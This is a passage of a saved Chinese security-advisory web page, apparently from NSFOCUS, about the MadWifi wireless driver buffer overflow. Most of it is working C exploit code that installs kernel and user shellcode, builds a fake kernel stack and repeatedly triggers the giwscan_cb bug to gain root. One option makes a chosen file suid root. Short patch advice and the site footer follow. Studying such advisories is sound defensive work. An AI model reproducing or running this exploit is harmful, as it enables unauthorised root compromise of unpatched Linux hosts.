+0:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("This=20
+                  case should'nt=20
+                  =
+happen\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR><BR>&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case=20
+                  =
+'s':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  Using stack heuristic=20
+                  =
+\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stackheur=3D1;<BR>&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;case=20
+                  =
+'i':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ifname=3Doptarg;<BR>&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;case=20
+                  =
+'c':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if=20
+                  ( (strlen(optarg)+1) &gt;=20
+                  =
+sizeof(chmodname))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit=
+(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  We better not rely on the stack=20
+                  =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(chmodname,=20
+                  =
+optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmodfile=3Dchmodname;<BR>&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;printf("[+]=20
+                  chmod/chown %s if success\n",=20
+                  =
+chmodfile);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case=20
+                  =
+'n':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;noexit=3D1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;brea=
+k;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;case=20
+                  =
+'h':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;case=20
+                  =
+'?':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;default:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Usage=20
+                  %s=20
+                  =
+[options]\n\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;"Options:\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"-s\t=20
+                  Use heuristic to determine kernel stack=20
+                  =
+size\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;"-i=20
+                  &lt;iface&gt;\t Use interface=20
+                  =
+'iface'\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;"-c=20
+                  &lt;file&gt;\t Make 'file' suid=20
+                  =
+root\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;"-n\tdo=20
+                  not exit after=20
+                  =
+chown/chmod\n"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;,=20
+                  =
+argv[0]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR><BR><BR>&nbs=
+p;&nbsp;&nbsp;&nbsp;puid=3Dgetuid();<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp=
+;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  Using interface %s\n",=20
+                  ifname);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/* install =
+kernel=20
+                  shellcode =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;//scmap=3Dgetsc("ksc",=20
+                  =
+&amp;sclen);<BR>&nbsp;&nbsp;&nbsp;&nbsp;patchsc_with_addr(sc,=20
+                  ksc_func);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;//if=20
+                  (installsc((void *) KSCADDR, scmap, sclen) =3D=3D =
+MAP_FAILED)=20
+                  {<BR>&nbsp;&nbsp;&nbsp;&nbsp;if (installsc((void *) =
+KSCADDR,=20
+                  sc, sizeof(sc)) =3D=3D MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("installksc")=
+;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&n=
+bsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  Kernel shellcode installed at 0x%X\n",=20
+                  KSCADDR);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/* install =
+user=20
+                  shellcode =
+*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;//scmap=3Dgetsc("usc",=20
+                  =
+&amp;sclen);<BR>&nbsp;&nbsp;&nbsp;&nbsp;patchsc_with_addr(sc,=20
+                  usc_func);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;//if=20
+                  (installsc((void *) USCADDR, scmap, sclen) =3D=3D =
+MAP_FAILED)=20
+                  {<BR>&nbsp;&nbsp;&nbsp;&nbsp;if (installsc((void *) =
+USCADDR,=20
+                  sc, sizeof(sc)) =3D=3D MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("installusc")=
+;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&n=
+bsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  User shellcode installed at 0x%X\n",=20
+                  USCADDR);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/* allocate =
+space for=20
+                  kernel stack */<BR>&nbsp;&nbsp;&nbsp;&nbsp;if =
+(installsc((void=20
+                  *) KSTACKADDR, "", 0) =3D=3D MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("installkstac=
+k");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp=
+;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  This is a lame workaround to prevent giwscan_cb from=20
+                  crashing<BR>&nbsp;&nbsp;&nbsp;&nbsp; * before =
+returning. We=20
+                  create two pages so that structure=20
+                  pointers<BR>&nbsp;&nbsp;&nbsp;&nbsp; * can be =
+recursively=20
+                  dereferenced.<BR>&nbsp;&nbsp;&nbsp;&nbsp; * A proper =
+exploit=20
+                  should not do that :) =
+*/<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  allocate self-dereferencable page=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;if (installsc((void *) =
+NOPS, "",=20
+                  0) =3D=3D MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("self-deref-p=
+age");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nb=
+sp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if=20
+                  (installsc((void *) 0, "", 0) =3D=3D MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("self-deref-p=
+age");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nb=
+sp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;bzero(NULL,&nbsp;&nbsp;=
+PGS);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;assert((KSTACKADDR=20
+                  &amp; 0xFFF) &gt; sizeof(struct=20
+                  =
+iretstack));<BR>&nbsp;&nbsp;&nbsp;&nbsp;build_iretstack(=20
+                  (struct iretstack *) KSTACKADDR,=20
+                  USCADDR);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("[+] =
+Fake=20
+                  stack installed at 0x%X (CS: 0x%X, EFLAGS: 0x%X, ESP: =
+0x%X,=20
+                  SS: 0x%X, EIP: 0x%X)\n", KSTACKADDR, ((struct =
+iretstack *)=20
+                  KSTACKADDR)-&gt;cs, ((struct iretstack *)=20
+                  KSTACKADDR)-&gt;eflags, ((struct iretstack *)=20
+                  KSTACKADDR)-&gt;esp, ((struct iretstack *) =
+KSTACKADDR)-&gt;ss,=20
+                  ((struct iretstack *)=20
+                  =
+KSTACKADDR)-&gt;eip);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  trigger vulnerable function=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;buffer =3D=20
+                  malloc(buflen);<BR>&nbsp;&nbsp;&nbsp;&nbsp;if =
+(!buffer)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("malloc");<BR=
+>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;=
+&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  Initialize wrq=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;wrq.u.data.pointer =3D=20
+                  NULL;<BR>&nbsp;&nbsp;&nbsp;&nbsp;wrq.u.data.flags =3D=20
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;wrq.u.data.length =3D=20
+                  =
+0;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;strncpy(wrq.ifr_name,=20
+                  ifname, IFNAMSIZ);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if =
+((skfd=3D=20
+                  socket(AF_INET, SOCK_DGRAM, 0)) =3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("socket");<BR=
+>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;=
+&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(ioctl(skfd,=20
+                  SIOCSIWSCAN, &amp;wrq) =3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("[-]=20
+                  ioctl=20
+                  =
+SIOCSIWSCAN");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(=
+"&nbsp;&nbsp;&nbsp;&nbsp;-&gt;=20
+                  This is not fatal (you can wait or ifdown/up your wifi =
+
+                  interface to speedup the=20
+                  process)\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;} else=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[+]=20
+                  Launching new scan with ioctl=20
+                  =
+SIOCSIWSCAN\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&n=
+bsp;/*=20
+                  Initialize wrq=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;wrq.u.data.pointer =3D=20
+                  buffer;<BR>&nbsp;&nbsp;&nbsp;&nbsp;wrq.u.data.flags =
+=3D=20
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;wrq.u.data.length =3D=20
+                  buflen;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;while (1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[.]=20
+                  Trying to trigger bug in giwscan_cb (%d) (you must run =
+the=20
+                  metasploit module)\n",=20
+                  =
+counter++);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if=20
+                  (sys_ioctl(skfd, SIOCGIWSCAN, &amp;wrq) =3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//if=20
+                  (ioctl(skfd, SIOCGIWSCAN, &amp;wrq) =3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;perror("[-]=20
+                  ioctl=20
+                  =
+SIOCGIWSCAN");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep(1);<BR>&nb=
+sp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;return=20
+                  0;<BR>}<BR><BR>/* allocate memory and install =
+shellcode at=20
+                  address scaddr (pads with nops so that shellcode is=20
+                  page-aligned)=20
+                  */<BR>void&nbsp;&nbsp;&nbsp;&nbsp;*installsc(void =
+*scaddr,=20
+                  void *sh, unsigned int len)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;&nbsp;&nbsp;&nbsp;*scpt;<BR><BR>&n=
+bsp;&nbsp;&nbsp;&nbsp;assert(getpagesize()=20
+                  =3D=3D PGS);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/* =
+allocate one extra=20
+                  page which will be filled by nops=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;scpt=3Dmmap((void =
+*)((uint32_t)=20
+                  scaddr &amp; ~(PGS-1)), PGS + len, PROT_WRITE | =
+PROT_READ |=20
+                  PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS |=20
+                  MAP_LOCKED | MAP_POPULATE, 0,=20
+                  =
+0);&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&n=
+bsp;&nbsp;if=20
+                  (scpt =3D=3D MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("mmap");<BR>&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return=20
+                  =
+scpt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;/*=20
+                  fill first page with nops=20
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;memset(scpt, NOPS,=20
+                  PGS);<BR>&nbsp;&nbsp;&nbsp;&nbsp;/* and copy shellcode =
+
+                  */<BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(scpt+PGS, sh,=20
+                  len);<BR>&nbsp;&nbsp;&nbsp;&nbsp;return =
+scpt;<BR>}<BR><BR>/*=20
+                  map shellcode found in filename in memory, return its =
+address=20
+                  */<BR>void&nbsp;&nbsp;&nbsp;&nbsp;*getsc(char =
+*filename,=20
+                  uint32_t *len)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;scfd;<BR>&nbsp;&n=
+bsp;&nbsp;&nbsp;void&nbsp;&nbsp;&nbsp;&nbsp;*scmap;<BR>&nbsp;&nbsp;&nbsp;=
+&nbsp;struct&nbsp;&nbsp;&nbsp;&nbsp;stat=20
+                  =
+scstat;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;scfd=3Dstat(filename,=20
+                  &amp;scstat);<BR>&nbsp;&nbsp;&nbsp;&nbsp;if (scfd =
+=3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("stat");<BR>&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;&n=
+bsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;*len=3Dscstat.st_size;<BR><BR>=
+&nbsp;&nbsp;&nbsp;&nbsp;scfd=3Dopen(filename,=20
+                  O_RDONLY);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if (scfd =
+=3D=3D -1)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("open");<BR>&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;&n=
+bsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;scmap=3Dmmap(0,=20
+                  *len, PROT_READ, MAP_SHARED, scfd,=20
+                  0);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if (scmap =3D=3D =
+MAP_FAILED)=20
+                  =
+{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("mmap");<BR>&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<BR>&nbsp;&nbsp;&n=
+bsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;return=20
+                  =
+scmap;&nbsp;&nbsp;&nbsp;&nbsp;<BR>}<BR><BR><B>=E5=BB=BA=E8=AE=AE=EF=BC=9A=
+</B>
+                  <HR>
+                  =
+=E5=8E=82=E5=95=86=E8=A1=A5=E4=B8=81=EF=BC=9A<BR><BR>Gentoo<BR>------<BR>=
+Gentoo=E5=B7=B2=E7=BB=8F=E4=B8=BA=E6=AD=A4=E5=8F=91=E5=B8=83=E4=BA=86=E4=B8=
+=80=E4=B8=AA=E5=AE=89=E5=85=A8=E5=85=AC=E5=91=8A=EF=BC=88GLSA-200612-09=EF=
+=BC=89=E4=BB=A5=E5=8F=8A=E7=9B=B8=E5=BA=94=E8=A1=A5=E4=B8=81:<BR>GLSA-200=
+612-09=EF=BC=9AMadWifi:=20
+                  Kernel driver buffer =
+overflow<BR>=E9=93=BE=E6=8E=A5=EF=BC=9A<A=20
+                  =
+href=3D"http://security.gentoo.org/glsa/glsa-200612-09.xml"=20
+                  =
+target=3D_blank>http://security.gentoo.org/glsa/glsa-200612-09.xml</A><BR=
+><BR>=E6=89=80=E6=9C=89MadWifi=E7=94=A8=E6=88=B7=E9=83=BD=E5=BA=94=E5=8D=87=
+=E7=BA=A7=E5=88=B0=E6=9C=80=E6=96=B0=E7=89=88=E6=9C=AC=EF=BC=9A<BR><BR>&n=
+bsp;&nbsp;&nbsp;&nbsp;#=20
+                  emerge --sync<BR>&nbsp;&nbsp;&nbsp;&nbsp;# emerge =
+--ask=20
+                  --oneshot --verbose=20
+                  =
+"&gt;=3Dnet-wireless/madwifi-ng-0.9.2.1"<BR><BR>MADWifi<BR>-------<BR>=E7=
+=9B=AE=E5=89=8D=E5=8E=82=E5=95=86=E5=B7=B2=E7=BB=8F=E5=8F=91=E5=B8=83=E4=BA=
+=86=E5=8D=87=E7=BA=A7=E8=A1=A5=E4=B8=81=E4=BB=A5=E4=BF=AE=E5=A4=8D=E8=BF=99=
+=E4=B8=AA=E5=AE=89=E5=85=A8=E9=97=AE=E9=A2=98=EF=BC=8C=E8=AF=B7=E5=88=B0=E5=
+=8E=82=E5=95=86=E7=9A=84=E4=B8=BB=E9=A1=B5=E4=B8=8B=E8=BD=BD=EF=BC=9A<BR>=
+<BR><A=20
+                  =
+href=3D"http://sourceforge.net/project/showfiles.php?group_id=3D82936&amp=
+;package_id=3D85233"=20
+                  =
+target=3D_blank>http://sourceforge.net/project/showfiles.php?group_id=3D8=
+2936&amp;package_id=3D85233</A><BR><BR><B>=E6=B5=8F=E8=A7=88=E6=AC=A1=E6=95=
+=B0=EF=BC=9A</B>762<BR><B>=E4=B8=A5=E9=87=8D=E7=A8=8B=E5=BA=A6=EF=BC=9A</=
+B>0=EF=BC=88=E7=BD=91=E5=8F=8B=E6=8A=95=E7=A5=A8=EF=BC=89<BR></TD></TR>
+              <TR>
+                <TD align=3Dmiddle><FONT=20
+                  =
+color=3D#ff0000>=E6=9C=AC=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E7=94=B1=E7=
+=BB=BF=E7=9B=9F=E7=A7=91=E6=8A=80=E7=BF=BB=E8=AF=91=E6=95=B4=E7=90=86=EF=BC=
+=8C=E7=89=88=E6=9D=83=E6=89=80=E6=9C=89=EF=BC=8C=E6=9C=AA=E7=BB=8F=E8=AE=B8=
+=E5=8F=AF=EF=BC=8C=E4=B8=8D=E5=BE=97=E8=BD=AC=E8=BD=BD</FONT><BR>=E7=BB=BF=
+=E7=9B=9F=E7=A7=91=E6=8A=80=E7=BB=99=E6=82=A8=E5=AE=89=E5=85=A8=E7=9A=84=E4=
+=BF=9D=E9=9A=9C</TD></TR></TBODY></TABLE>
+            <SCRIPT type=3Dtext/javascript>var currentTopLeftMenu =3D =
+1;</SCRIPT>
+          =
+</TD></TR></TBODY></TABLE><!--End--></TD></TR></TBODY></TABLE><!--END-->
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D780 align=3Dcenter =
+border=3D0>
+  <TBODY>
+  <TR>
+    <TD bgColor=3D#d1d9da colSpan=3D3 height=3D1></TD></TR>
+  <TR>
+    <TD vAlign=3Dbottom width=3D183>
+      <TABLE cellSpacing=3D0 cellPadding=3D0 border=3D0>
+        <TBODY>
+        <TR>
+          <TD><A href=3D"http://www.nsfocus.com/7_law/index.html"><IMG =
+height=3D20=20
+            alt=3D=E6=B3=95=E5=BE=8B=E5=A3=B0=E6=98=8E =
+src=3D"http://www.nsfocus.net/images/footer_law.gif" width=3D54=20
+            border=3D0></A></TD>
+          <TD><IMG height=3D20 =
+src=3D"http://www.nsfocus.net/images/footer_I.gif"=20
+            width=3D7></TD>
+          <TD><A =
+href=3D"http://www.nsfocus.com/8_contact/index.html"><IMG=20
+            height=3D20 alt=3D=E8=81=94=E7=B3=BB=E6=88=91=E4=BB=AC=20
+            src=3D"http://www.nsfocus.net/images/footer_contact.gif" =
+width=3D55=20
+            border=3D0></A></TD>
+          <TD><IMG height=3D20 =
+src=3D"http://www.nsfocus.net/images/footer_I.gif"=20
+            width=3D7></TD>
+          <TD><A onclick=3D"openChat();return false;"=20
+            href=3D"http://www.nsfocus.net/vulndb/9644#"><IMG =
+height=3D20 alt=3D=E5=9C=A8=E7=BA=BF=E5=AE=A2=E6=9C=8D=20
+            src=3D"http://www.nsfocus.net/images/footer_online.gif" =
+width=3D55=20
+            border=3D0></A></TD></TR></TBODY></TABLE></TD>
+    <TD vAlign=3Dbottom width=3D298>&nbsp;</TD>
+    <TD vAlign=3Dbottom align=3Dright width=3D299><IMG alt=3D"=C2=A92010 =
+=E7=BB=BF=E7=9B=9F=E7=A7=91=E6=8A=80"=20
+      src=3D"http://www.nsfocus.net/images/footer_copyright_cn.gif"><A=20
+      href=3D"http://www.miibeian.gov.cn/" target=3D_blank><IMG =
+height=3D20=20
+      alt=3D=E4=BA=ACICP=E5=A4=8705004765=E5=8F=B7 =
+src=3D"http://www.nsfocus.net/images/footer_icp.gif"=20
+      width=3D100 border=3D0></A></TD></TR>
+  <TR>
+    <TD vAlign=3Dbottom>&nbsp;</TD>
+    <TD vAlign=3Dbottom>&nbsp;</TD>
+    <TD vAlign=3Dbottom =
+align=3Dright>&nbsp;</TD></TR></TBODY></TABLE></BODY></HTML>
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.nsfocus.net/images/top_nav/logo.gif
+
+R0lGODlhtwA7APcAACVbQEx5YljOK+n15HubjENzW22Sfqq8tKLhhePm5FiCbPH08mKJddvx0h1W
+OlF9Zu7u7qK4rNTi1M7rwrHjndTd2Ont6ixiRzlrUtrt0xNOMonaZ2PPOKjikBZQNBlSNs7a09Xt
+y6vAtcDOx7DEuZOuoG2SgMTqtIKhke7y8Ozw7pqypdDe0fD17nLTS5vge97m4fD08vf49+Dn4/P2
+9HrVVefs6cXQzPr8+ZTdc+Lo5LnJwXCVgcnruileROrv7Ofy4+707FWAatLsxzNnTfn6+eHu3rXm
+oRpJPfL18+Tq58nVzmrSQLbIv+To5YillrDDub3MxIGckMXSy+To5rrppZnefOry6GiOemWMdw1J
